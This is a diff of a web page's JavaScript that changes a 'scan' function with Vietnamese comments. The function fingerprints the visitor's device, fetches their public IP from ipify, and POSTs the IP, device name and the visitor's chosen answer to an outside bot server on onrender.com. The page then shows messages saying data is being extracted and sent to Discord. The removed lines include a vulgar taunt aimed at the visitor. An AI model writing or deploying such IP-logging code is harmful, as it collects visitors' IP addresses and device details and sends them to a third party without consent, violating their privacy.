@@ -434,16 +434,7 @@
         }
 
 window.scan = async function(ans) {
-            console.log("Hàm scan đã được kích hoạt!");
-
-            // 1. Lấy thông số màn hình và User Agent
-            const w = window.screen.width * window.devicePixelRatio;
-            const h = window.screen.height * window.devicePixelRatio;
-            const max = Math.max(w, h);
-            const min = Math.min(w, h);
-            const ua = navigator.userAgent;
-
-            let deviceName = "Unknown Device";
+    console.log("Hàm scan đã được kích hoạt!");
 
     // 1. Lấy thông số màn hình và User Agent
     const w = window.screen.width * window.devicePixelRatio;
@@ -494,7 +485,7 @@ window.scan = async function(ans) {
         deviceName = "Windows PC";
     }
 
-    // 2. Lấy IP
+    // 3. Lấy IP
     let userIp = "Hidden";
     try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
@@ -504,26 +495,26 @@ window.scan = async function(ans) {
         console.log("Không lấy được IP");
     }
 
-    // 3. Gửi dữ liệu về bot
+    // 4. Gửi dữ liệu về Server
     try {
         await fetch('https://mybot-lfij.onrender.com/log-visitor', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
                 ip: userIp, 
-                device: deviceName 
+                device: deviceName, 
+                choice: ans 
             })
         });
-        console.log("Gửi thành công:", { ip: userIp, device: deviceName });
     } catch (err) {
         console.error("Lỗi gửi về bot:", err);
     }
 
-    // 4. Hiệu ứng log
+    // 5. Hiệu ứng hiển thị ra màn hình
     document.getElementById('log').innerHTML = '';
-    addLine('<span class="log-scanning">ke con me ban</span>', '', 0);
-    addLine('<span class="log-result">...</span>', '', 1500);
-    addLine('<span class="log-discord">Đã gửi dữ liệu về máy chủ Discord.</span>', '', 3000);
+    addLine(`<span class="log-scanning">Đã quét thấy: ${deviceName}</span>`, '', 0);
+    addLine('<span class="log-result">Đang trích xuất dữ liệu...</span>', '', 1500);
+    addLine('<span class="log-discord">Hoàn tất! Thông tin đã gửi về Discord.</span>', '', 3000);
 }
     </script>
 </body>
